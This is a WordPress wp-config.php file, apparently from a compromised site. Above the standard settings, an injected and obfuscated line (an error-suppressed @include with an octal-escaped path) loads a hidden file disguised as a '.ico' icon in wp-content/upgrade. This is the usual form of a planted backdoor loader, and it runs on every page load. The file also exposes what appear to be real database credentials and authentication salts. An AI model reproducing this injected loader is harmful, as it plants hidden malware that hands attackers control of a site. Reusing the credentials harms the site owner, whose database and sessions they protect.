<?php
/*f222d*/

@include "\057ho\155e/\167eb\153ol\164ov\057pu\142li\143_h\164ml\057fu\156da\143io\156pa\142lo\154an\144sm\141na\163.o\162g/\146un\144ac\151on\057wp\055co\156te\156t/\165pg\162ad\145/.\07025\1464e\0716.\151co";

/*f222d*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'nuestra7_wp3' );

/** MySQL database username */
define( 'DB_USER', 'nuestra7_wp3' );

/** MySQL database password */
define( 'DB_PASSWORD', 'R.UbaMkknwf5SZTdngy49' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'CxrVFy418LGJvWXI0OiY1Fl3gO4V2p8WfclxanJVwZDqfBnf0frmX7pM8tqks1h9');
define('SECURE_AUTH_KEY',  'pKAtbwYXknSI5M1jXgZzTFdrd97gMjNmQDH2BwEWEVWbyw7BnIslAlxupZU7DJiY');
define('LOGGED_IN_KEY',    'KxSavZxIjr9zc0ByGFqUm8EFB6BfE94CZ2dTq9VnX7yMQOw0xWNfdqjrAQt79o59');
define('NONCE_KEY',        'vKqAjy7KrDiIpeAJ9z1SXsKTSKwqta092kZbKtAj1PYqIHSeZZYDmBmzcZwIgMGH');
define('AUTH_SALT',        'EomeGjXCWlXXkOrzC4i7HaqORfEVbt5DtX68PisYiJ0nnl1xW08nQQdSpITqCtAS');
define('SECURE_AUTH_SALT', 'RPEsku2WIbMoYTgubqusYTtSx613QTlWELThCCIW78OuqniQ2bog2PiJflcTDA17');
define('LOGGED_IN_SALT',   'MOngHbrM1IzsGQBlYC9rsCVQsG6U1WhuVCfO6ExZr6nISjh17MysqiYpx3brAElw');
define('NONCE_SALT',       'o7sLrrFbAZSlIMBvtVdLn4LRCXRRB9txINrTMzrlt0RiOMjkwe61fH94qHH632EW');

/**
 * Other customizations.
 */
define('FS_METHOD','direct');define('FS_CHMOD_DIR',0755);define('FS_CHMOD_FILE',0644);
define('WP_TEMP_DIR',dirname(__FILE__).'/wp-content/uploads');

/**
 * Turn off automatic updates since these are managed upstream.
 */
define('AUTOMATIC_UPDATER_DISABLED', true);


/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', dirname( __FILE__ ) . '/' );
}

/** Sets up WordPress vars and included files. */
require_once( ABSPATH . 'wp-settings.php' );
